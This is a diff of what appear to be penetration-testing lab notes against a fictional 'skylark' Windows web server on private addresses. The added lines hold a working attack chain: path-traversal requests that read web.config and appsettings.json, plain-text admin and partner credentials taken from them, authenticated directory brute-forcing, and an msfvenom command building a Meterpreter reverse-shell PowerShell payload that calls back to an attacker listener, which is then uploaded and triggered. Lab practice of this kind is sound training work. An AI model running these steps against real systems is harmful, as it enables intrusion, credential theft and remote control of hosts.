@@ -17,7 +17,7 @@ sudo nmap -sU --open -p 161 192.168.240.250
 nmap 192.168.240.220
 
 # ports open: 80,135,139,445,5900(vnc),5985,47001(winrm),49664-49670
-nmap -sT -A -p 80,5900,47001 192.168.240.220
+nmap -sT -A -p 80 192.168.186.220
 
 # enumerate vnc, cannot connect
 nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p 5900 192.168.240.220
@@ -40,8 +40,30 @@ feroxbuster --wordlist /usr/share/wordlists/dirb/big.txt --url http://skylark:Us
 skylark:User+dcGvfwTbjV[]
 
 # test for path traversal
-http://192.168.186.220/download?filename=/../../../../../../../../../../C:/inetpub/wwwroot/web.config
-/backend/?view=/../../../../../../../../../../dev/shm/test.php&cmd=ls
+http://192.168.229.220/download?filename=../../../../../../../../../../../inetpub/wwwroot/web.config
+
+http://192.168.229.220/download?filename=../../../../../../../../../../../inetpub/wwwroot/appsettings.json
+
+# obtain admin creds
+skylark_admin
+Admin!_xDHj88vAnS!__
+
+# with admin creds look  for directories again
+feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://skylark_admin:Admin!_xDHj88vAnS!__@192.168.229.220
+
+# find /configuration
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.45.229 lport=443 -f psh-reflection -o shell.ps1
+
+# partner creds
+partner:Skylark__ChangingTheWorld!
+
+http://192.168.229.220/upload
+http://192.168.229.220/configuration
+
+C:\Uploads
+C:\Uploads\91a05a3b_shell.ps1
+ https://HOUSTON01.SKYLARK.COM/download?filename=shell.ps1&token=91a05a3b
+
 ```
 
 .221 (austin02.SKYLARK.com)
